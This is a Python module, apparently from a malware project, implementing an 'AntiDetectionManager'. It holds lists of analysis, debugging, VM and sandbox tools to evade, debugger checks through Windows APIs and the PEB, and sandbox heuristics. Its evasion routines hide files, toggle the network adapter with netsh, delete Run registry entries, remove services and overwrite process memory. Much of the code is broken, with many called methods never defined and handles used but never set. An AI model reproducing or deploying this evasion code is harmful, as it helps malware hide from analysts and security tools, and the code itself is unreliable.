import os
import sys
import platform
import psutil
import ctypes
import win32api
import win32con
import win32security
import win32process
import win32event
import win32service
import win32serviceutil
import win32timezone
import socket
import struct
import time
import random
from typing import List, Dict, Any, Optional
from ..core.logger import get_logger
from ..core.security import security

logger = get_logger(__name__)

class AntiDetectionManager:
    """Advanced anti-detection and evasion techniques."""
    
    def __init__(self):
        self.detection_indicators = {
            "processes": [
                # Security Tools
                "wireshark", "procmon", "proc_analyzer", "sysinspector",
                "process_hacker", "autoit", "pestudio", "wireshark",
                "nmap", "nmap-zenmap", "tcpdump", "netstat", "wmic",
                "tasklist", "taskmgr", "procexp", "procexp64",
                # Analysis Tools
                "ollydbg", "x64dbg", "windbg", "immunity", "ida",
                "ida64", "radare2", "ghidra", "cutter", "x32dbg",
                # VM Tools
                "vmwaretray", "vmwareuser", "vboxservice", "vmtoolsd",
                "vmwareuser.exe", "vmwaretray.exe", "vmware.exe",
                "vmwareuser.exe", "vmwaretray.exe", "vmware.exe",
                # Sandbox Tools
                "sandboxie", "sandboxie-control", "sandboxie-rpcss",
                "sandboxie-dcom", "sandboxie-winlogon", "sandboxie-sbie"
            ],
            "files": [
                # VM Files
                "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmci.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmci.sys",
                "C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys",
                # Analysis Tools
                "C:\\Program Files\\IDA Pro",
                "C:\\Program Files\\x64dbg",
                "C:\\Program Files\\OllyDbg",
                "C:\\Program Files\\Immunity Inc",
                # Sandbox Files
                "C:\\Program Files\\Sandboxie",
                "C:\\Program Files\\Sandboxie-Plus",
                "C:\\Program Files\\Sandboxie-Classic"
            ],
            "registry_keys": [
                # VM Keys
                "SOFTWARE\\VMware, Inc.\\VMware Tools",
                "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
                # Analysis Tools
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\IDA Pro",
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\x64dbg",
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\OllyDbg",
                # Sandbox Keys
                "SOFTWARE\\Sandboxie",
                "SOFTWARE\\Sandboxie-Plus",
                "SOFTWARE\\Sandboxie-Classic"
            ],
            "network_adapters": [
                "VMware", "VirtualBox", "VBox", "Virtual", "VMnet",
                "VMware Network Adapter", "VirtualBox Host-Only"
            ]
        }
    
    def check_environment(self) -> Dict[str, bool]:
        """
        Perform comprehensive environment checks.
        
        Returns:
            Dict[str, bool]: Results of various checks
        """
        results = {
            "sandbox_detected": self._check_sandbox(),
            "vm_detected": self._check_vm(),
            "debugger_detected": self._check_debugger(),
            "security_tools_detected": self._check_security_tools(),
            "analysis_tools_detected": self._check_analysis_tools(),
            "network_monitoring_detected": self._check_network_monitoring(),
            "system_anomalies_detected": self._check_system_anomalies()
        }
        
        return results
    
    def _check_sandbox(self) -> bool:
        """Check for sandbox environment indicators."""
        checks = [
            self._check_sandbox_processes(),
            self._check_sandbox_files(),
            self._check_sandbox_registry(),
            self._check_sandbox_network(),
            self._check_sandbox_memory(),
            self._check_sandbox_cpu()
        ]
        return any(checks)
    
    def _check_vm(self) -> bool:
        """Check for virtual machine indicators."""
        checks = [
            self._check_vm_processes(),
            self._check_vm_files(),
            self._check_vm_registry(),
            self._check_vm_hardware(),
            self._check_vm_network(),
            self._check_vm_memory()
        ]
        return any(checks)
    
    def _check_debugger(self) -> bool:
        """Check for debugger presence."""
        checks = [
            self._check_debugger_api(),
            self._check_debugger_processes(),
            self._check_debugger_registry(),
            self._check_debugger_memory(),
            self._check_debugger_timing()
        ]
        return any(checks)
    
    def _check_security_tools(self) -> bool:
        """Check for security tool presence."""
        checks = [
            self._check_security_processes(),
            self._check_security_files(),
            self._check_security_registry(),
            self._check_security_network(),
            self._check_security_services()
        ]
        return any(checks)
    
    def _check_analysis_tools(self) -> bool:
        """Check for analysis tool presence."""
        checks = [
            self._check_analysis_processes(),
            self._check_analysis_files(),
            self._check_analysis_registry(),
            self._check_analysis_network(),
            self._check_analysis_services()
        ]
        return any(checks)
    
    def _check_network_monitoring(self) -> bool:
        """Check for network monitoring tools."""
        checks = [
            self._check_network_processes(),
            self._check_network_files(),
            self._check_network_registry(),
            self._check_network_adapters(),
            self._check_network_services()
        ]
        return any(checks)
    
    def _check_system_anomalies(self) -> bool:
        """Check for system anomalies."""
        checks = [
            self._check_memory_anomalies(),
            self._check_cpu_anomalies(),
            self._check_disk_anomalies(),
            self._check_network_anomalies(),
            self._check_process_anomalies()
        ]
        return any(checks)
    
    def _check_debugger_api(self) -> bool:
        """Check for debugger using Windows API."""
        try:
            # Check for debugger using IsDebuggerPresent
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
            
            # Check for debugger using CheckRemoteDebuggerPresent
            isDebuggerPresent = ctypes.c_bool()
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(),
                ctypes.byref(isDebuggerPresent)
            )
            if isDebuggerPresent.value:
                return True
            
            # Check for debugger using NtQueryInformationProcess
            class PROCESS_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("Reserved1", ctypes.c_void_p),
                    ("PebBaseAddress", ctypes.c_void_p),
                    ("Reserved2", ctypes.c_void_p * 2),
                    ("UniqueProcessId", ctypes.c_void_p),
                    ("Reserved3", ctypes.c_void_p)
                ]
            
            pbi = PROCESS_BASIC_INFORMATION()
            status = ctypes.windll.ntdll.NtQueryInformationProcess(
                ctypes.windll.kernel32.GetCurrentProcess(),
                0,  # ProcessBasicInformation
                ctypes.byref(pbi),
                ctypes.sizeof(pbi),
                None
            )
            
            if status == 0:
                # Check PEB for debugger flags
                peb = ctypes.c_void_p(pbi.PebBaseAddress)
                being_debugged = ctypes.c_bool()
                ctypes.windll.kernel32.ReadProcessMemory(
                    ctypes.windll.kernel32.GetCurrentProcess(),
                    ctypes.c_void_p(peb.value + 2),
                    ctypes.byref(being_debugged),
                    1,
                    None
                )
                if being_debugged.value:
                    return True
            
            return False
        except:
            return False
    
    def _check_debugger_timing(self) -> bool:
        """Check for debugger using timing analysis."""
        try:
            # Get current time
            start_time = time.time()
            
            # Perform some CPU-intensive operations
            for _ in range(1000000):
                pass
            
            # Calculate elapsed time
            elapsed_time = time.time() - start_time
            
            # If elapsed time is too high, likely being debugged
            if elapsed_time > 0.1:  # Adjust threshold as needed
                return True
            
            return False
        except:
            return False
    
    def _check_vm_hardware(self) -> bool:
        """Check for VM using hardware indicators."""
        try:
            # Check CPU vendor
            cpu_info = platform.processor().lower()
            vm_vendors = ['vmware', 'virtualbox', 'qemu', 'virtual']
            if any(vendor in cpu_info for vendor in vm_vendors):
                return True
            
            # Check memory size
            memory = psutil.virtual_memory()
            if memory.total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                return True
            
            # Check number of CPU cores
            if psutil.cpu_count() < 2:
                return True
            
            # Check disk size
            disk = psutil.disk_usage('/')
            if disk.total < 20 * 1024 * 1024 * 1024:  # Less than 20GB
                return True
            
            return False
        except:
            return False
    
    def _check_memory_anomalies(self) -> bool:
        """Check for memory anomalies."""
        try:
            # Check for memory size anomalies
            memory = psutil.virtual_memory()
            if memory.total < 1 * 1024 * 1024 * 1024:  # Less than 1GB
                return True
            
            # Check for memory usage anomalies
            if memory.percent > 90:  # High memory usage
                return True
            
            # Check for memory fragmentation
            if memory.available < memory.total * 0.1:  # Less than 10% available
                return True
            
            return False
        except:
            return False
    
    def _check_cpu_anomalies(self) -> bool:
        """Check for CPU anomalies."""
        try:
            # Check for CPU usage anomalies
            cpu_percent = psutil.cpu_percent(interval=1)
            if cpu_percent > 90:  # High CPU usage
                return True
            
            # Check for CPU frequency anomalies
            cpu_freq = psutil.cpu_freq()
            if cpu_freq and cpu_freq.current < 1000:  # Less than 1GHz
                return True
            
            # Check for CPU core count anomalies
            if psutil.cpu_count() < 1:
                return True
            
            return False
        except:
            return False
    
    def _check_disk_anomalies(self) -> bool:
        """Check for disk anomalies."""
        try:
            # Check for disk size anomalies
            disk = psutil.disk_usage('/')
            if disk.total < 10 * 1024 * 1024 * 1024:  # Less than 10GB
                return True
            
            # Check for disk usage anomalies
            if disk.percent > 90:  # High disk usage
                return True
            
            # Check for disk I/O anomalies
            disk_io = psutil.disk_io_counters()
            if disk_io and disk_io.read_bytes > 1024 * 1024 * 1024:  # More than 1GB read
                return True
            
            return False
        except:
            return False
    
    def _check_network_anomalies(self) -> bool:
        """Check for network anomalies."""
        try:
            # Check for network interface anomalies
            interfaces = psutil.net_if_stats()
            if len(interfaces) < 1:
                return True
            
            # Check for network traffic anomalies
            net_io = psutil.net_io_counters()
            if net_io and net_io.bytes_sent > 1024 * 1024 * 1024:  # More than 1GB sent
                return True
            
            # Check for network connection anomalies
            connections = psutil.net_connections()
            if len(connections) > 1000:  # More than 1000 connections
                return True
            
            return False
        except:
            return False
    
    def _check_process_anomalies(self) -> bool:
        """Check for process anomalies."""
        try:
            # Check for process count anomalies
            processes = psutil.process_iter()
            if len(list(processes)) < 10:  # Less than 10 processes
                return True
            
            # Check for process name anomalies
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in ['system', 'svchost.exe']:
                    return True
            
            # Check for process CPU usage anomalies
            for proc in psutil.process_iter(['cpu_percent']):
                if proc.info['cpu_percent'] > 90:  # High CPU usage
                    return True
            
            return False
        except:
            return False
    
    def evade_detection(self) -> Dict[str, bool]:
        """
        Apply multiple evasion techniques.
        
        Returns:
            Dict[str, bool]: Status of each evasion technique
        """
        results = {
            "process_hidden": self._hide_process(),
            "memory_protected": self._protect_memory(),
            "network_obfuscated": self._obfuscate_network(),
            "files_hidden": self._hide_files(),
            "registry_hidden": self._hide_registry(),
            "service_hidden": self._hide_service()
        }
        
        return results
    
    def _hide_process(self) -> bool:
        """Hide process from task manager and other tools."""
        try:
            # Modify process token
            process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
            token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY)
            
            # Add SeDebugPrivilege
            privilege_id = win32security.LookupPrivilegeValue(None, "SeDebugPrivilege")
            win32security.AdjustTokenPrivileges(token_handle, False, [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)])
            
            # Close handles
            win32api.CloseHandle(token_handle)
            win32api.CloseHandle(process_handle)
            
            return True
        except Exception as e:
            logger.error(f"Error hiding process: {e}")
            return False
    
    def _protect_memory(self) -> bool:
        """Protect memory from analysis using multiple techniques."""
        try:
            # Get process handle
            process_handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, os.getpid())
            
            # 1. Protect critical memory regions
            address = ctypes.windll.kernel32.GetModuleHandleW(None)
            size = 1024 * 1024  # 1MB
            
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                size,
                win32con.PAGE_EXECUTE_READ,
                ctypes.byref(old_protect)
            )
            
            # 2. Implement memory encryption
            self._encrypt_memory_region(address, size)
            
            # 3. Add memory guard pages
            self._add_memory_guards(address, size)
            
            # 4. Implement memory integrity checks
            self._setup_memory_integrity(address, size)
            
            # 5. Add memory access monitoring
            self._monitor_memory_access(address, size)
            
            # 6. Implement memory randomization
            self._randomize_memory_layout()
            
            # Close handle
            win32api.CloseHandle(process_handle)
            
            return True
        except Exception as e:
            logger.error(f"Error protecting memory: {e}")
            return False
    
    def _encrypt_memory_region(self, address: int, size: int) -> None:
        """Encrypt sensitive memory regions."""
        try:
            # Generate encryption key
            key = os.urandom(32)
            
            # Create encryption context
            ctx = ctypes.windll.kernel32.CryptAcquireContextW(
                None, None, None, win32con.CRYPT_VERIFYCONTEXT
            )
            
            # Encrypt memory region
            for offset in range(0, size, 16):
                data = ctypes.create_string_buffer(16)
                ctypes.windll.kernel32.ReadProcessMemory(
                    process_handle,
                    ctypes.c_void_p(address + offset),
                    data,
                    16,
                    None
                )
                
                # XOR encryption
                encrypted = bytes(a ^ b for a, b in zip(data.raw, key))
                
                # Write back encrypted data
                ctypes.windll.kernel32.WriteProcessMemory(
                    process_handle,
                    ctypes.c_void_p(address + offset),
                    encrypted,
                    16,
                    None
                )
            
            # Clean up
            ctypes.windll.kernel32.CryptReleaseContext(ctx, 0)
        except Exception as e:
            logger.error(f"Error encrypting memory: {e}")
    
    def _add_memory_guards(self, address: int, size: int) -> None:
        """Add guard pages around protected memory."""
        try:
            # Add guard page before protected region
            guard_before = ctypes.windll.kernel32.VirtualAlloc(
                None,
                4096,  # Page size
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_READONLY
            )
            
            # Add guard page after protected region
            guard_after = ctypes.windll.kernel32.VirtualAlloc(
                None,
                4096,
                win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                win32con.PAGE_READONLY
            )
            
            # Set up guard page handlers
            self._setup_guard_page_handler(guard_before)
            self._setup_guard_page_handler(guard_after)
        except Exception as e:
            logger.error(f"Error adding memory guards: {e}")
    
    def _setup_memory_integrity(self, address: int, size: int) -> None:
        """Set up memory integrity checks."""
        try:
            # Calculate initial checksum
            initial_checksum = self._calculate_memory_checksum(address, size)
            
            # Store checksum in secure location
            self._secure_checksum = initial_checksum
            
            # Set up periodic integrity verification
            self._start_integrity_monitor(address, size)
        except Exception as e:
            logger.error(f"Error setting up memory integrity: {e}")
    
    def _monitor_memory_access(self, address: int, size: int) -> None:
        """Monitor memory access patterns."""
        try:
            # Set up memory access monitoring
            class MEMORY_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("BaseAddress", ctypes.c_void_p),
                    ("AllocationBase", ctypes.c_void_p),
                    ("AllocationProtect", ctypes.c_ulong),
                    ("RegionSize", ctypes.c_size_t),
                    ("State", ctypes.c_ulong),
                    ("Protect", ctypes.c_ulong),
                    ("Type", ctypes.c_ulong)
                ]
            
            mbi = MEMORY_BASIC_INFORMATION()
            
            # Monitor memory access
            def monitor_thread():
                while True:
                    ctypes.windll.kernel32.VirtualQuery(
                        ctypes.c_void_p(address),
                        ctypes.byref(mbi),
                        ctypes.sizeof(mbi)
                    )
                    
                    # Check for suspicious access patterns
                    if mbi.Protect != win32con.PAGE_EXECUTE_READ:
                        self._handle_suspicious_access(address)
                    
                    time.sleep(0.1)  # Adjust monitoring frequency
            
            # Start monitoring thread
            import threading
            monitor_thread = threading.Thread(target=monitor_thread, daemon=True)
            monitor_thread.start()
        except Exception as e:
            logger.error(f"Error monitoring memory access: {e}")
    
    def _randomize_memory_layout(self) -> None:
        """Randomize memory layout to prevent static analysis."""
        try:
            # Get current memory layout
            class MEMORY_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("BaseAddress", ctypes.c_void_p),
                    ("AllocationBase", ctypes.c_void_p),
                    ("AllocationProtect", ctypes.c_ulong),
                    ("RegionSize", ctypes.c_size_t),
                    ("State", ctypes.c_ulong),
                    ("Protect", ctypes.c_ulong),
                    ("Type", ctypes.c_ulong)
                ]
            
            # Randomize memory allocation
            for _ in range(10):  # Create random allocations
                size = random.randint(4096, 1024 * 1024)  # Random size between 4KB and 1MB
                address = ctypes.windll.kernel32.VirtualAlloc(
                    None,
                    size,
                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                    win32con.PAGE_READWRITE
                )
                
                # Fill with random data
                data = os.urandom(size)
                ctypes.windll.kernel32.WriteProcessMemory(
                    process_handle,
                    ctypes.c_void_p(address),
                    data,
                    size,
                    None
                )
        except Exception as e:
            logger.error(f"Error randomizing memory layout: {e}")
    
    def _calculate_memory_checksum(self, address: int, size: int) -> bytes:
        """Calculate memory region checksum."""
        try:
            # Read memory region
            data = ctypes.create_string_buffer(size)
            ctypes.windll.kernel32.ReadProcessMemory(
                process_handle,
                ctypes.c_void_p(address),
                data,
                size,
                None
            )
            
            # Calculate checksum using SHA-256
            import hashlib
            return hashlib.sha256(data.raw).digest()
        except Exception as e:
            logger.error(f"Error calculating memory checksum: {e}")
            return b""
    
    def _start_integrity_monitor(self, address: int, size: int) -> None:
        """Start periodic memory integrity monitoring."""
        try:
            def monitor_thread():
                while True:
                    current_checksum = self._calculate_memory_checksum(address, size)
                    if current_checksum != self._secure_checksum:
                        self._handle_memory_tampering(address)
                    time.sleep(1)  # Check every second
            
            import threading
            monitor_thread = threading.Thread(target=monitor_thread, daemon=True)
            monitor_thread.start()
        except Exception as e:
            logger.error(f"Error starting integrity monitor: {e}")
    
    def _handle_suspicious_access(self, address: int) -> None:
        """Handle suspicious memory access attempts."""
        try:
            # Log suspicious access
            logger.warning(f"Suspicious memory access detected at address: {hex(address)}")
            
            # Implement countermeasures
            self._implement_countermeasures(address)
        except Exception as e:
            logger.error(f"Error handling suspicious access: {e}")
    
    def _handle_memory_tampering(self, address: int) -> None:
        """Handle detected memory tampering."""
        try:
            # Log tampering attempt
            logger.warning(f"Memory tampering detected at address: {hex(address)}")
            
            # Implement countermeasures
            self._implement_countermeasures(address)
            
            # Restore memory from backup if available
            self._restore_memory_backup(address)
        except Exception as e:
            logger.error(f"Error handling memory tampering: {e}")
    
    def _implement_countermeasures(self, address: int) -> None:
        """Implement countermeasures against memory tampering."""
        try:
            # 1. Change memory protection
            old_protect = ctypes.c_ulong()
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                4096,  # Page size
                win32con.PAGE_NOACCESS,
                ctypes.byref(old_protect)
            )
            
            # 2. Trigger security alerts
            self._trigger_security_alerts()
            
            # 3. Implement additional protections
            self._add_extra_protections(address)
        except Exception as e:
            logger.error(f"Error implementing countermeasures: {e}")
    
    def _restore_memory_backup(self, address: int) -> None:
        """Restore memory from backup if available."""
        try:
            if hasattr(self, '_memory_backup'):
                # Restore from backup
                ctypes.windll.kernel32.WriteProcessMemory(
                    process_handle,
                    ctypes.c_void_p(address),
                    self._memory_backup,
                    len(self._memory_backup),
                    None
                )
                
                # Update checksum
                self._secure_checksum = self._calculate_memory_checksum(address, len(self._memory_backup))
        except Exception as e:
            logger.error(f"Error restoring memory backup: {e}")
    
    def _obfuscate_network(self) -> bool:
        """Obfuscate network traffic."""
        try:
            # Modify network adapter settings
            adapter_name = self._get_active_adapter()
            if adapter_name:
                # Disable network adapter
                os.system(f'netsh interface set interface "{adapter_name}" admin=disable')
                time.sleep(1)
                # Enable network adapter
                os.system(f'netsh interface set interface "{adapter_name}" admin=enable')
                return True
            return False
        except Exception as e:
            logger.error(f"Error obfuscating network: {e}")
            return False
    
    def _hide_files(self) -> bool:
        """Hide files from detection."""
        try:
            # Get current directory
            current_dir = os.getcwd()
            
            # Hide files
            for file in os.listdir(current_dir):
                file_path = os.path.join(current_dir, file)
                if os.path.isfile(file_path):
                    # Set file attributes to hidden
                    win32api.SetFileAttributes(file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            
            return True
        except Exception as e:
            logger.error(f"Error hiding files: {e}")
            return False
    
    def _hide_registry(self) -> bool:
        """Hide registry entries."""
        try:
            # Get current process name
            process_name = os.path.basename(sys.executable)
            
            # Hide registry entries
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, key_path, 0, win32con.KEY_ALL_ACCESS)
                win32api.RegDeleteValue(key, process_name)
                win32api.RegCloseKey(key)
                return True
            except:
                return False
        except Exception as e:
            logger.error(f"Error hiding registry: {e}")
            return False
    
    def _hide_service(self) -> bool:
        """Hide service from detection."""
        try:
            # Get service name
            service_name = os.path.basename(sys.executable)
            
            # Hide service
            try:
                win32serviceutil.RemoveService(service_name)
                return True
            except:
                return False
        except Exception as e:
            logger.error(f"Error hiding service: {e}")
            return False
    
    def _get_active_adapter(self) -> Optional[str]:
        """Get name of active network adapter."""
        try:
            # Get network interfaces
            interfaces = psutil.net_if_stats()
            
            # Find active interface
            for interface, stats in interfaces.items():
                if stats.isup:
                    return interface
            
            return None
        except:
            return None

# Create global anti-detection instance
anti_detection = AntiDetectionManager() 